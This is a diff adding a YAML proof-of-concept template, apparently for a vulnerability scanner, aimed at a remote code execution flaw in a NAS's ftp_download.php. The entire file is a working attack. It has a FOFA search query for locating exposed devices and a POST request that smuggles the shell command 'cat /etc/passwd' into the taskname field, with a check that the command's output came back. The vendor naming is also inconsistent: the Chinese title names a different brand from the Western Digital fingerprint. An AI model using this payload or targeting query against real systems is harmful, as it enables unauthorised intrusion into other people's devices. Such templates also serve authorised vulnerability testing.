@@ -1,0 +1,18 @@
+id: poc-yaml-west-nas-ftp-download-php-rce
+info:
+  name: 西部数码 NAS ftp_download.php 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: western_digital_mycloud_nas
+  fofa: icon_hash="-1074357885" && header="PHP/5.4.16"
+requests:
+- method: POST
+  path: /web/addons/ftp_download.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: action=create&taskname=";cat%20/etc/passwd;"&host=127.0.0.1&user=test&pwd=test&dest_dir=/tmp&schedule=0&lang=en
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && contains(body,"\"success\":true") && contains(body,"ftp_download.php") && !contains(body,"<html")
+variables: {}
+transport: http
